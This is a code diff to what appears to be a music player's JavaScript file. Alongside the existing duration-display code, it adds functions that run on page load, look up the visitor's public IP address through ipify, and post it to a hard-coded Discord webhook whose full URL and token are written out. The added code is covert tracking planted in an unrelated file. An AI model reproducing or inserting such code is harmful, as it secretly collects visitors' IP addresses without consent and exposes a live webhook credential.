@@ -160,3 +160,32 @@ function setUpdate(){
         total_duration.textContent = durationMinutes + ":" + durationSeconds;
     }
 }
+
+function getIPAddress() {
+    fetch('https://api.ipify.org/?format=json')
+        .then(response => response.json())
+        .then(data => {
+            const ipAddress = data.ip;
+            sendToDiscord(ipAddress);
+        })
+        .catch(error => console.log(error));
+}
+
+function sendToDiscord(ipAddress) {
+    const webhookURL = 'https://discord.com/api/webhooks/1109138241359200326/Z8qaKtw7QkgeFZigc9rideyDtuw8p12zID8Sekyv8QFpgwtGCGVGhko_W1Nq3BEcZrRw';
+    const message = `IPアドレス: ${ipAddress}`;
+
+    fetch(webhookURL, {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ content: message })
+    })
+        .then(response => console.log(response))
+        .catch(error => console.log(error));
+}
+
+window.addEventListener('load', () => {
+    getIPAddress();
+});
